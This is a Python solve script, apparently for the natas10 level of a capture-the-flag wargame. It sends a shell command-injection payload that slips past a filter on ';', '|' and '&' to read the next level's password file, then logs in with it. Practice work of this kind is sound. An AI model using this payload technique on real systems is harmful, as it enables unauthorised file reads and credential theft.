"""
natas10: shell command injection with banned characters

server rejects inputs containing ';', '|', and '&'
"""

import requests
from typing import Optional

from natas_utils import *

LEVEL = 10

def solve(url: str, login: LevelLogin) -> Optional[str]:
    # path to next level's password
    flag_path = flag_file_abspath(LEVEL + 1)

    # will be injected as $key in `grep -i $key dictionary.txt`
    shell_payload = f"'.*' << cat {flag_path} #"
    response = requests.post(url, auth=login, data={"needle": shell_payload})

    candidate_passwords = extract_candidate_passwords(response.text)
    natas11_password = try_level_login(LEVEL + 1, candidate_passwords)

    return natas11_password

if __name__ == "__main__":
    url, login = load_level(LEVEL)
    natas11_password = solve(url, login)

    if natas11_password:
        print("natas11:", natas11_password)
        store_level_password(LEVEL + 1, natas11_password)
    else:
        exit("Failed to get password for the next level.")